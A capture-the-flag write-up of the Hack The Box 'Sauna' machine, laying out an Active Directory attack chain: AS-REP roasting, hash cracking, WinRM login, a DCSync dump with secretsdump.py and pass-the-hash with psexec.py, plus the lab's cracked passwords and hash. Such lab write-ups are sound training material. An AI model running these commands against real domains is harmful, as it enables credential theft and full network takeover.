title: Sauna - Hack The Box
excerpt: "Sauna is an easy difficulty Windows machine that features Active Directory enumeration and
exploitation. Possible usernames can be derived from employee full names listed on the website.
With these usernames, an ASREPRoasting attack can be performed, which results in hash for an
account that doesn't require Kerberos pre-authentication. This hash can be subjected to an
offline brute force attack, in order to recover the plaintext password for a user that is able to
WinRM to the box. Running WinPEAS reveals that another system user has been configured to
automatically login and it identifies their password. This second user also has Windows remote
management permissions. BloodHound reveals that this user has the DS-Replication-Get-Changes-
All extended right, which allows them to dump password hashes from the Domain Controller in a
DCSync attack. Executing this attack returns the hash of the primary domain administrator, which
can be used with Impacket's psexec.py in order to gain a shell on the box as authority system."

## Synopsis

Sauna is an easy difficulty Windows machine that features Active Directory enumeration and
exploitation. Possible usernames can be derived from employee full names listed on the website.
With these usernames, an ASREPRoasting attack can be performed, which results in hash for an
account that doesn't require Kerberos pre-authentication. This hash can be subjected to an
offline brute force attack, in order to recover the plaintext password for a user that is able to
WinRM to the box. Running WinPEAS reveals that another system user has been configured to
automatically login and it identifies their password. This second user also has Windows remote
management permissions. BloodHound reveals that this user has the DS-Replication-Get-Changes-
All extended right, which allows them to dump password hashes from the Domain Controller in a
DCSync attack. Executing this attack returns the hash of the primary domain administrator, which
can be used with Impacket's psexec.py in order to gain a shell on the box as
NT_AUTHORITY\SYSTEM .

## Reconaissance

### HTTP
let's added sauna.htb into our hosts

![](/assets/img/sauna/1.png)

in about.html get information about user, this page section has different between `index.html`

![](/assets/img/sauna/2.png)

this box very stright forward for lateral movement, i've done use `feroxbuster` for finding juicy files but not there. 

im gonna make wordlists from about.html, something like below:

```bash
FergusSmith
fsmith
fergusS
ShaunCoins
scoins
Shaunc
HugoBear
Hbear
HugoB
BowieTaylor
Btaylor
bowieTaylor
SophieDriver
Sdriver
SophieD
StevenKerb
Skerb
StevenK
```

then let's use `GetNPUsers.py` from impacket to perform `AS-REP` Roasting for finding Pre-Authentication option enabled with those list, AS-REP Roasting is one of kerebroasting methodology.

```bash
GetNPUsers.py -usersfile users.txt -format hashcat -dc-ip $ip EgotisticalBank/
```

![](/assets/img/sauna/3.png)

as you can see we get NTLM hash, let use `hashcat` with module 18200 for cracking that hash with prompt:

```bash
hashcat -a 0 -m 18200 hash /usr/share/wordlists/rockyou.txt 
```

![](/assets/img/sauna/4.png)

```text
Thestrokes23
```

we able to logged in using `evil-wirm` with prompt:

```bash
evil-winrm -i $ip -u fsmith -p 'Thestrokes23'
```

## Privilege Escalation

during the enumeration process i uploaded `winpeas.exe` into target and the result is we retrieve password for `svc_loanmgr` user.

![](/assets/img/sauna/6.png)

```bash
Moneymakestheworldgoround!
```

for next enumeration, i decide to upload sharphound.exe for gather information against active directory environment. 
execute command below for collect all data

```powershell
./Sharphound.exe -c all
```

![](/assets/img/sauna/7.png)

download that zip file into host, the start `bloodhound`; we're going into Dangerous Right feature for determining rights permission.

![](/assets/img/sauna/10.png)

result from bloodhound

![](/assets/img/sauna/13.png)

get an information like image below

![](/assets/img/sauna/12.png)

we can identify `SID` for user `svc_loanmgr` with prompt:

```powershell
Get-LocalUser -Name svc_loanmgr | Select Name, sid
```

![](/assets/img/sauna/11.png)

which mean this `svc_loanmgr` user has rights permission to perform DCSync attack, in short DCSync attack is Replication Service Remote Protocol (MS-DRSR) to pretend to be a domain controller (DC) in order to get user credentials from another DC. and now we can use `secretdump.py` from impacket for dumping administrator hash with following command:

```bash
secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!'@10.10.10.175
```

![](/assets/img/sauna/14.png)

now we can pass the hash (PTH) using `psexec` with following command:

```bash
psexec.py -hashes :823452073d75b9d1cf70ebdf86c7f98e administrator@10.10.10.175
```
